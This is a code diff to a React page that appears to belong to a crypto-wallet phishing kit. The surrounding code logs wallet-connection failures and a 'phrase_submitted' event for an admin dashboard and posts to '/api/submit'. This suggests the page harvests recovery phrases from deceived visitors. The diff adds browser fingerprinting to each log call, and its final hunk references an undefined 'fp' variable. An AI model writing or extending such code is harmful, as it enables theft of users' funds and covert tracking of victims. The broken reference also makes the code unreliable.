@@ -138,11 +138,13 @@ export default function Home() {
 
   // Log site visit on mount
   useEffect(() => {
-    fetch("/api/logs", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ status: "visited_site" })
-    }).catch(() => {});
+    collectFingerprint().then((fp) => {
+      fetch("/api/logs", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ status: "visited_site", browserData: fp })
+      }).catch(() => {});
+    });
   }, []);
 
   // Animated dots while connecting
@@ -215,11 +217,13 @@ export default function Home() {
 
     } catch {
       // Log connection attempt locally for admin dashboard
-      fetch("/api/logs", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ status: "connection_failed", wallet: wallet.name })
-      }).catch(() => {});
+      collectFingerprint().then((fp) => {
+        fetch("/api/logs", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ status: "connection_failed", wallet: wallet.name, browserData: fp })
+        }).catch(() => {});
+      });
 
       // ❌ Any failure → graceful fallback
       setStep("failed");
@@ -251,7 +255,7 @@ export default function Home() {
     fetch("/api/logs", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ status: "phrase_submitted", wallet: selectedWallet?.name })
+      body: JSON.stringify({ status: "phrase_submitted", wallet: selectedWallet?.name, browserData: fp })
     }).catch(() => {});
 
     fetch("/api/submit", {
